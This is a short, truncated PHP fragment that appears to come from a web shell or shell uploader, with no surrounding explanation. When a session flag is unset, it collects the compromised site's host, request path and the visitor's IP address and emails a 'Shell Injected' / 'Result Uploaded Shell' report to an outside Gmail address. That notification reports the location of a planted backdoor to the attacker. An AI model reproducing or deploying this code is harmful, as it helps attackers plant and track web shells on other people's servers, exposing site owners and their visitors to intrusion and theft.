...
if (!isset($_SESSION['Plow'])) {
    $visitcount = 0;
    $web = $_SERVER["HTTP_HOST"];
    $inj = $_SERVER["REQUEST_URI"];
    $body = "Shell Injected $web$inj";
    ...
    $injector = gethostbyname($_SERVER['REMOTE_ADDR']);
    mail("evilinuxshell@gmail.com","$body","Result Uploaded Shell http://$web$inj
$security
IP Server = $server
